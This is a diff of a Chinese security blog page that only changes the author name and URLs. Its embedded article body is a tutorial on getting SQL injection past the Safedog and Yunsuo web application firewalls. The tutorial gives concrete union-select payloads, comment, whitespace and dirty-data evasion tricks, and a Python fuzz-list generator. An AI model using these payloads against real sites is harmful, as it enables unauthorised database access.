@@ -5,65 +5,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="generator" content="self_209&#39;blog">
-    <title>waf bypass (sql) - self_209&#39;blog</title>
-    <meta name="author" content="self_209">
+    <meta name="generator" content="1uh5an&#39;blog">
+    <title>waf bypass (sql) - 1uh5an&#39;blog</title>
+    <meta name="author" content="1uh5an">
     
     
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"self_209","sameAs":["https://github.com/self209","https://twitter.com/","mailto:2662686939@qq.com"]},"articleBody":"安全狗、云锁waf绕过\n\n\n\n\nbypass 安全狗\n注释符绕过and or 可以使用异或绕过，也可以使用多行注释绕过\n\n异或绕过\n\n多行注释绕过\n\nunion select使用多行注释代替空格绕过\n\nunion/*{fuzz}*/select\n\n\n\n函数绕过就在括号前插入即可绕过\n\n\n分块传输绕过分块传输绕过使用burp插件即可。\n\n插件地址：https://github.com/c0ny1/chunked-coding-converter\n\n\n\n\n参数污染配合注释符绕过正常的参数污染是没办法绕过的，还需要配合注释符欺骗waf。\n\n配合注释符欺骗waf\n\n?id=1–+%23%0a/*&amp;id=-2+union+select+1,2,database()–+*/\n\n\n还有一种\n\n?name=abc–+%23%0a/*&amp;id=-2+union+select+1,2,database()&amp;*/pass=abc\n\n\n\n内联注释绕过内联注释（/*!*/）当!后面没有接版本号时，会直接执行里面内容。当!后面接数据库版本号时并且自身版本号大于等于数字，就会将注释中的内容执行，否则就会当做注释来处理。\n内联注释没法绕过union select，但是可以绕过函数过滤。在括号前插入内联注释，！后面的数字要大于自身版本号，就可以绕过敏感函数。\n\nlike、REGEXP匹配注释符绕过like\nlike关键字可看作是一个精简的正则表达式功能。主要是针对字符型字段的，在一个字符型字段列中检索包含对应子串的。\n1select * from 表名 where 字段名 like 对应值（子串）\n\n当我们检索注释符的时候，waf会认为是注释符那么注释符之后的sql语句waf就会认为没有威胁，从而导致绕过。\n\n–%20 、%23\n\n敏感函数也可以用%0a绕过\n\n\n\nREGEXP\n正则表达式用来匹配文本的特殊的串(字符集合)(匹配文本、将一个模式(正则表达式)与一个文本患进行比较)\n与like差不多，只不过这里只能用%23\n\n脏数据绕过脏数据绕过是利用WAF长度资源限制，一般WAF只检测前面的2M或4M的内容，具体还得看配置。\n用脏数据代替空格\n\nunion{/*脏数据*/}select{/*脏数据*/}     \n函数：\ndatabase{/*脏数据*/}()\nuser{/*脏数据*/}()\n\n\nhttp Content-Type绕过将http Content-Type类型改为multipart/form-data\n\n\n\nbypass 云锁\n注释配合空白字符绕过云锁对and or 并不拦截，对内联注释和多行注释过滤相当严格，尝试很多都没能绕过，最后参考别的师傅的文章运用单行注释配合空白字符进行绕过。\n\n\n空白字符：\n\n1&#x27;%20&#x27;, &#x27;%09&#x27;, &#x27;%0a&#x27;, &#x27;%0b&#x27;, &#x27;%0c&#x27;, &#x27;%0d&#x27;, &#x27;%a0&#x27;, &#x27;%5C%4E&#x27;, &#x27;\\\\N&#x27;\n\n单行注释：\n\n1&#x27;%2D%2D%2B&#x27;, &#x27;%2D%2D%20%2D&#x27;, &#x27;%2D%2D%0a%2D&#x27;\n\n对单行注释和空白字符进行组合成fuzz字典，在union select前面进行fuzz。\n123456789101112131415import itertoolsList = [&#x27;%20&#x27;, &#x27;%09&#x27;, &#x27;%0a&#x27;, &#x27;%0b&#x27;, &#x27;%0c&#x27;, &#x27;%0d&#x27;, &#x27;%2d%2d&#x27;, &#x27;%23&#x27;, &#x27;%a0&#x27;, &#x27;%2D%2D%2B&#x27;, &#x27;%5C%4E&#x27;, &#x27;\\\\N&#x27;, &#x27;/%2A/&#x27;, &#x27;%2D%2D%20%2D&#x27;, &#x27;%2D%2D%0a%2D&#x27;, &#x27;/%2A%2A/&#x27;]count = 0num = 3for i in itertools.product(List, repeat=num):    count += 1    combination = &#x27;&#x27;.join(i)    payload = &#x27;&#123;&#125;&#x27;.format(combination)    print(payload)\n\n\n\n\n使用单行注释配合空白字符绕过，之后的语句都不会被拦截\n\n\nhttp Content-Type畸形boundary绕过将http Content-Type类型改为multipart/form-data，并且在boundary值后面加上分号后面加任意字符就可以绕过，具体绕过原理不太清楚。\n\n\n不使用畸形boundary无法绕过\n\n\n\n脏数据绕过脏数据绕过是利用WAF长度资源限制，一般WAF只检测前面的2M或4M的内容，具体还得看配置。\n用脏数据代替空格\n\nunion{/*脏数据*/}select{/*脏数据*/}     \n函数：\ndatabase{/*脏数据*/}()\nuser{/*脏数据*/}()\n\n\n\n","dateCreated":"2022-06-20T13:55:36+08:00","dateModified":"2022-06-20T18:45:25+08:00","datePublished":"2022-06-20T13:55:36+08:00","description":"安全狗、云锁waf绕过","headline":"waf bypass (sql)","image":[null,"103533.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://self209.github.io/2022/06/20/20220620/"},"publisher":{"@type":"Organization","name":"self_209","sameAs":["https://github.com/self209","https://twitter.com/","mailto:2662686939@qq.com"]},"url":"https://self209.github.io/2022/06/20/20220620/","keywords":"bypass","thumbnailUrl":"103533.jpg"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"1uh5an","sameAs":["https://github.com/self209","https://twitter.com/","mailto:2662686939@qq.com"]},"articleBody":"安全狗、云锁waf绕过\n\n\n\n\nbypass 安全狗\n注释符绕过and or 可以使用异或绕过，也可以使用多行注释绕过\n\n异或绕过\n\n多行注释绕过\n\nunion select使用多行注释代替空格绕过\n\nunion/*{fuzz}*/select\n\n\n\n函数绕过就在括号前插入即可绕过\n\n\n分块传输绕过分块传输绕过使用burp插件即可。\n\n插件地址：https://github.com/c0ny1/chunked-coding-converter\n\n\n\n\n参数污染配合注释符绕过正常的参数污染是没办法绕过的，还需要配合注释符欺骗waf。\n\n配合注释符欺骗waf\n\n?id=1–+%23%0a/*&amp;id=-2+union+select+1,2,database()–+*/\n\n\n还有一种\n\n?name=abc–+%23%0a/*&amp;id=-2+union+select+1,2,database()&amp;*/pass=abc\n\n\n\n内联注释绕过内联注释（/*!*/）当!后面没有接版本号时，会直接执行里面内容。当!后面接数据库版本号时并且自身版本号大于等于数字，就会将注释中的内容执行，否则就会当做注释来处理。\n内联注释没法绕过union select，但是可以绕过函数过滤。在括号前插入内联注释，！后面的数字要大于自身版本号，就可以绕过敏感函数。\n\nlike、REGEXP匹配注释符绕过like\nlike关键字可看作是一个精简的正则表达式功能。主要是针对字符型字段的，在一个字符型字段列中检索包含对应子串的。\n1select * from 表名 where 字段名 like 对应值（子串）\n\n当我们检索注释符的时候，waf会认为是注释符那么注释符之后的sql语句waf就会认为没有威胁，从而导致绕过。\n\n–%20 、%23\n\n敏感函数也可以用%0a绕过\n\n\n\nREGEXP\n正则表达式用来匹配文本的特殊的串(字符集合)(匹配文本、将一个模式(正则表达式)与一个文本患进行比较)\n与like差不多，只不过这里只能用%23\n\n脏数据绕过脏数据绕过是利用WAF长度资源限制，一般WAF只检测前面的2M或4M的内容，具体还得看配置。\n用脏数据代替空格\n\nunion{/*脏数据*/}select{/*脏数据*/}     \n函数：\ndatabase{/*脏数据*/}()\nuser{/*脏数据*/}()\n\n\nhttp Content-Type绕过将http Content-Type类型改为multipart/form-data\n\n\n\nbypass 云锁\n注释配合空白字符绕过云锁对and or 并不拦截，对内联注释和多行注释过滤相当严格，尝试很多都没能绕过，最后参考别的师傅的文章运用单行注释配合空白字符进行绕过。\n\n\n空白字符：\n\n1&#x27;%20&#x27;, &#x27;%09&#x27;, &#x27;%0a&#x27;, &#x27;%0b&#x27;, &#x27;%0c&#x27;, &#x27;%0d&#x27;, &#x27;%a0&#x27;, &#x27;%5C%4E&#x27;, &#x27;\\\\N&#x27;\n\n单行注释：\n\n1&#x27;%2D%2D%2B&#x27;, &#x27;%2D%2D%20%2D&#x27;, &#x27;%2D%2D%0a%2D&#x27;\n\n对单行注释和空白字符进行组合成fuzz字典，在union select前面进行fuzz。\n123456789101112131415import itertoolsList = [&#x27;%20&#x27;, &#x27;%09&#x27;, &#x27;%0a&#x27;, &#x27;%0b&#x27;, &#x27;%0c&#x27;, &#x27;%0d&#x27;, &#x27;%2d%2d&#x27;, &#x27;%23&#x27;, &#x27;%a0&#x27;, &#x27;%2D%2D%2B&#x27;, &#x27;%5C%4E&#x27;, &#x27;\\\\N&#x27;, &#x27;/%2A/&#x27;, &#x27;%2D%2D%20%2D&#x27;, &#x27;%2D%2D%0a%2D&#x27;, &#x27;/%2A%2A/&#x27;]count = 0num = 3for i in itertools.product(List, repeat=num):    count += 1    combination = &#x27;&#x27;.join(i)    payload = &#x27;&#123;&#125;&#x27;.format(combination)    print(payload)\n\n\n\n\n使用单行注释配合空白字符绕过，之后的语句都不会被拦截\n\n\nhttp Content-Type畸形boundary绕过将http Content-Type类型改为multipart/form-data，并且在boundary值后面加上分号后面加任意字符就可以绕过，具体绕过原理不太清楚。\n\n\n不使用畸形boundary无法绕过\n\n\n\n脏数据绕过脏数据绕过是利用WAF长度资源限制，一般WAF只检测前面的2M或4M的内容，具体还得看配置。\n用脏数据代替空格\n\nunion{/*脏数据*/}select{/*脏数据*/}     \n函数：\ndatabase{/*脏数据*/}()\nuser{/*脏数据*/}()\n\n\n\n","dateCreated":"2022-06-20T13:55:36+08:00","dateModified":"2022-06-20T18:45:25+08:00","datePublished":"2022-06-20T13:55:36+08:00","description":"安全狗、云锁waf绕过","headline":"waf bypass (sql)","image":[null,"103533.jpg"],"mainEntityOfPage":{"@type":"WebPage","@id":"https://1uh5an.github.io/2022/06/20/20220620/"},"publisher":{"@type":"Organization","name":"1uh5an","sameAs":["https://github.com/self209","https://twitter.com/","mailto:2662686939@qq.com"]},"url":"https://1uh5an.github.io/2022/06/20/20220620/","keywords":"bypass","thumbnailUrl":"103533.jpg"}</script>
     <meta name="description" content="安全狗、云锁waf绕过">
 <meta property="og:type" content="blog">
 <meta property="og:title" content="waf bypass (sql)">
-<meta property="og:url" content="https://self209.github.io/2022/06/20/20220620/index.html">
-<meta property="og:site_name" content="self_209&#39;blog">
+<meta property="og:url" content="https://1uh5an.github.io/2022/06/20/20220620/index.html">
+<meta property="og:site_name" content="1uh5an&#39;blog">
 <meta property="og:description" content="安全狗、云锁waf绕过">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620153839060.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620154623324.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620154704334.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620154841942.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620160738143.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620160700294.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620160956630.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620161116084.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620161523645.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620161556470.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620161655772.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620161940122.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620162240135.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620162641105.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620162738583.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620172635268.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620180048836.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620180312759.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620180520129.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620181313450.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620182038748.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620183039621.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620183056033.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620182908799.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620153451484.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620145038209.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620152248937.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620144832812.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620144904696.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620144719753.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620145844739.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620150016116.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620150223887.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620150427437.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620152415087.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620151104438.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620151217346.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620153025275.png">
-<meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620152023116.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620153839060.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620154623324.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620154704334.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620154841942.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620160738143.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620160700294.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620160956630.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620161116084.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620161523645.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620161556470.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620161655772.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620161940122.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620162240135.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620162641105.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620162738583.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620172635268.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620180048836.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620180312759.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620180520129.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620181313450.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620182038748.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620183039621.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620183056033.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620182908799.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620153451484.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620145038209.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620152248937.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620144832812.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620144904696.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620144719753.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620145844739.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620150016116.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620150223887.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620150427437.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620152415087.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620151104438.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620151217346.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620153025275.png">
+<meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620152023116.png">
 <meta property="article:published_time" content="2022-06-20T05:55:36.000Z">
 <meta property="article:modified_time" content="2022-06-20T10:45:25.786Z">
-<meta property="article:author" content="self_209">
+<meta property="article:author" content="1uh5an">
 <meta property="article:tag" content="bypass">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://self209.github.io/2022/06/20/20220620/image-20220620153839060.png">
+<meta name="twitter:image" content="https://1uh5an.github.io/2022/06/20/20220620/image-20220620153839060.png">
     
     
         
@@ -71,8 +71,8 @@
     
     
     
-        <meta property="og:image" content="https://self209.github.io/2022/06/20/20220620/103533.jpg"/>
-        <meta class="swiftype" name="image" data-type="enum" content="https://self209.github.io/2022/06/20/20220620/103533.jpg"/>
+        <meta property="og:image" content="https://1uh5an.github.io/2022/06/20/20220620/103533.jpg"/>
+        <meta class="swiftype" name="image" data-type="enum" content="https://1uh5an.github.io/2022/06/20/20220620/103533.jpg"/>
     
     
     <!--STYLES-->
@@ -102,7 +102,7 @@
             href="/"
             aria-label=""
         >
-            self_209&#39;blog
+            1uh5an&#39;blog
         </a>
     </div>
     
@@ -460,7 +460,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=https://self209.github.io/2022/06/20/20220620/"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://1uh5an.github.io/2022/06/20/20220620/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -473,7 +473,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=https://self209.github.io/2022/06/20/20220620/"
+                    target="new" href="https://plus.google.com/share?url=https://1uh5an.github.io/2022/06/20/20220620/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -486,7 +486,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=https://self209.github.io/2022/06/20/20220620/&amp;title=waf bypass (sql)"
+                    target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=https://1uh5an.github.io/2022/06/20/20220620/&amp;title=waf bypass (sql)"
                     title="分享到 QQ"
                     aria-label="分享到 QQ"
                 >
@@ -515,7 +515,7 @@
 
                 <footer id="footer" class="main-content-wrap">
     <span class="copyrights">
-        Copyrights &copy; 2022 self_209. All Rights Reserved.
+        Copyrights &copy; 2023 1uh5an. All Rights Reserved.
     </span>
 </footer>
 
@@ -568,7 +568,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=https://self209.github.io/2022/06/20/20220620/"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://1uh5an.github.io/2022/06/20/20220620/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -581,7 +581,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=https://self209.github.io/2022/06/20/20220620/"
+                    target="new" href="https://plus.google.com/share?url=https://1uh5an.github.io/2022/06/20/20220620/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -594,7 +594,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=https://self209.github.io/2022/06/20/20220620/&amp;title=waf bypass (sql)"
+                    target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=https://1uh5an.github.io/2022/06/20/20220620/&amp;title=waf bypass (sql)"
                     title="分享到 QQ"
                     aria-label="分享到 QQ"
                 >
@@ -626,7 +626,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://twitter.com/intent/tweet?text=https://self209.github.io/2022/06/20/20220620/"
+                        href="https://twitter.com/intent/tweet?text=https://1uh5an.github.io/2022/06/20/20220620/"
                         aria-label="分享到 Twitter"
                     >
                         <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
@@ -639,7 +639,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://plus.google.com/share?url=https://self209.github.io/2022/06/20/20220620/"
+                        href="https://plus.google.com/share?url=https://1uh5an.github.io/2022/06/20/20220620/"
                         aria-label="分享到 Google+"
                     >
                         <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
@@ -652,7 +652,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="http://connect.qq.com/widget/shareqq/index.html?url=https://self209.github.io/2022/06/20/20220620/&amp;title=waf bypass (sql)"
+                        href="http://connect.qq.com/widget/shareqq/index.html?url=https://1uh5an.github.io/2022/06/20/20220620/&amp;title=waf bypass (sql)"
                         aria-label="分享到 QQ"
                     >
                         <i class="fab fa-qq" aria-hidden="true"></i><span>分享到 QQ</span>
@@ -674,7 +674,7 @@
             <i class="fa fa-times"></i>
         </div>
         
-            <h4 id="about-card-name">self_209</h4>
+            <h4 id="about-card-name">1uh5an</h4>
         
             <div id="about-card-bio"><p>author.bio</p>
 </div>
